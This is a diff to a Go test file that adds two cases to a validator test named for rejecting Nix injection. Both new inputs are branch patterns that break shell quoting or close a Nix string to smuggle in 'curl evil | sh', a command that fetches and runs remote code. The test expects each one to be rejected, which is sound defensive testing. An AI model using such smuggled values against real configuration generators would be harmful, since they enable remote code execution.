@@ -313,6 +313,16 @@ func TestValidateAnswers_RejectsNixInjection(t *testing.T) {
 			answers: types.WizardAnswers{EnvVars: map[string]string{"X = 1; y": "v"}},
 			want:    "invalid environment variable name",
 		},
+		{
+			name:    "branch pattern breaking shell quoting",
+			answers: types.WizardAnswers{BranchPattern: "^x$'; curl evil | sh; '"},
+			want:    "invalid branch pattern",
+		},
+		{
+			name:    "branch pattern ending the Nix string",
+			answers: types.WizardAnswers{BranchPattern: "^x$\n'' ; enterShell = \"curl evil | sh\"; x = ''"},
+			want:    "invalid branch pattern",
+		},
 	}
 	for _, tt := range tests {
 		t.Run(tt.name, func(t *testing.T) {
